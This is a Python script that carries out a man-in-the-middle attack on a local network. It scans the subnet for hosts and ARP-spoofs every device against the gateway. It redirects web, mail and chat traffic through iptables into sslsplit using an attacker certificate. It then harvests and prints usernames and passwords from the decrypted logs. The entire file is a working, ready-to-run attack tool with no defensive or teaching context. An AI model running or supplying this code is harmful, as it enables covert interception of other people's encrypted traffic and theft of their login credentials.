#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import os
import re
import threading
import subprocess
from urllib import unquote


def enable_ip_forward():
	path = "/proc/sys/net/ipv4/ip_forward"
	f = open(path, "w")
	f.write('1')
	f.close()


def scan(ip):
	arp_req = scapy.ARP(pdst=ip)
	bcst = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_req_bcst = bcst/arp_req
	ans_list = scapy.srp(arp_req_bcst, timeout=1, verbose=False)[0]

	client_list = []
	for x in ans_list:
		client_dict = {"ip": x[1].psrc, "mac": x[1].hwsrc}
		client_list.append(client_dict)
	return client_list


def spoofing(target, spoof):
	packet = scapy.ARP(op=2, pdst=target["ip"],
	                   hwdst=target["mac"], psrc=spoof["ip"])
	scapy.send(packet, verbose=False)


def restore(dst, src):
	packet = scapy.ARP(
		op=2, pdst=dst["ip"], hwdst=dst["mac"], psrc=src["ip"], hwsrc=src["mac"])
	scapy.send(packet, count=4, verbose=False)


def sslsplit():
	print("Start sslsplit...")
	cmd_list = ['sudo iptables -t nat -F', 'sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080', 'sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443', 'sudo iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443',
             'sudo iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443', 'sudo iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443', 'sudo iptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080']
	for str in cmd_list:
		os.system(str)
	os.system('mkdir logdir')
	os.system('sslsplit -d -l connections.log -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080')


def arp_spoof(gateway, victims, e):
	enable_ip_forward()
	print("ARP spoofing...")
	while e.is_set() == False:
		for victim in victims:
			spoofing(victim, gateway)
			spoofing(gateway, victim)
		time.sleep(2)


def find_acc_pwd(e):
	time.sleep(2)  # wait the setting of arp_spoof and sslsplit
	print("Fetching avaliable username and password...")
	pattern = re.compile(r'username=.*&password=.*')
	index = 0
	while e.is_set() == False:
		files = os.listdir('logdir')
		count = 0
		acc_list = []
		pwd_list = []
		for f_name in files:
			path = 'logdir/'
			path = path + f_name
			f = open(path, 'r')
			data = f.read()
			result = re.findall(pattern, data)
			if result:
				for res in result:
					acc_list.append(res.split('&')[0][9:])
					pwd_list.append(res.split('&')[1][9:])
					count = count + 1
		if count > index:
			for i in range(count-index):
				print('Found username = ' +
				      unquote(acc_list[index+i]) + ', password = ' + unquote(pwd_list[index+i]))
			index = count


pattern = re.compile(r"([\w.][\w.]*'?\w?)")
data = str(subprocess.check_output('ip route', shell=True))
route_res = re.findall(pattern, data)

default_gateway = route_res[2]
gateway = scan(default_gateway)[0]
domain = default_gateway + '/24'
victims = scan(domain)
print("Available devices\n------------------------------")
print("IP\t\t\tMAC\n------------------------------")
for victim in victims:
	if victim != gateway:
		print(victim["ip"] + '\t\t' + victim["mac"])


e = threading.Event()
t1 = threading.Thread(target=arp_spoof, args=(gateway, victims, e))
t2 = threading.Thread(target=sslsplit)
t3 = threading.Thread(target=find_acc_pwd, args=(e,))
t1.start()
t2.start()
t3.start()

while True:
	try:
		time.sleep(1)
	except KeyboardInterrupt:
		print("\nARP spoofing is terminated, restoring ARP table")
		for victim in victims:
			if victim != gateway:
				restore(victim, gateway)
				restore(gateway, victim)
		e.set()
		os.system('sudo iptables -t nat -F')
		os.system('sudo rm -r logdir/')
		break
